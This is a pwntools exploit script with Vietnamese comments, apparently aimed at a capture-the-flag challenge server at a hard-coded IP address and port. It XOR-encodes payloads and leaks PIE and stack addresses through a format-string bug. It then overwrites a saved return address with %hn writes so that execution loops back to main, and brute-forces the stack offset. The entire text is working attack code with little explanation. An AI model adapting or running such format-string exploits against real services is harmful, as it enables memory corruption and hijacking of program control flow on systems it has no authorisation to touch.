from pwn import *

context.log_level = 'error'
HOST = '18.212.136.134'
PORT = 8887
OFF_MAIN = 0x12f4 

def check_offset(diff):
    try:
        p = remote(HOST, PORT)
        
        # 1. Leak PIE & Stack
        current_key = b'\xff' * 32
        
        def send(payload):
            nonlocal current_key
            payload = payload.ljust(32, b'\x00')
            to_send = bytes([a ^ b for a, b in zip(payload, current_key)])
            p.sendlineafter(b'>> ', b'1')
            sleep(0.05)
            p.send(to_send)
            current_key = payload
            return p.recvuntil(b'1. Keep', drop=True)

        leak_data = send(b'%20$p|%1$p').split(b'|')
        pie_base = int(leak_data[0], 16) - OFF_MAIN
        stack_addr = int(leak_data[1], 16)
        
        target_addr = stack_addr + diff
        main_addr = pie_base + OFF_MAIN
        
        # 2. Ghi đè Return Address thành Main (Loop)
        print(f"[*] Testing diff: {hex(diff)} ...", end='')
        
        # Ghi 6 bytes (3 lần)
        for i in range(3): 
            part = (main_addr >> (16 * i)) & 0xffff
            tgt = target_addr + (i * 2)
            if part == 0: part = 0x10000
            fmt = f"%{part}c%9$hn".encode()
            pad = 24 - len(fmt)
            # Gửi payload và TỰ ĐỘNG CẬP NHẬT KEY
            send(fmt + b'A'*pad + p64(tgt))

        # 3. Trigger return
        p.sendlineafter(b'>> ', b'2')
        
        # 4. Check banner
        check = p.recvuntil(b'format string haters', timeout=3)
        p.close()
        
        if b'format string haters' in check:
            print(" --> SUCCESS!")
            return True
        print(" --> Fail")
        return False
        
    except:
        try: p.close()
        except: pass
        print(" --> Error")
        return False

print("[-] Bắt đầu dò lại Stack (Fixed Key Update)...")
# Chỉ dò quanh 0x58
for diff in [0x50, 0x58, 0x60, 0x68]:
    if check_offset(diff):
        print(f"\n[!!!] OFFSET CHUẨN LÀ: {hex(diff)} [!!!]")
        break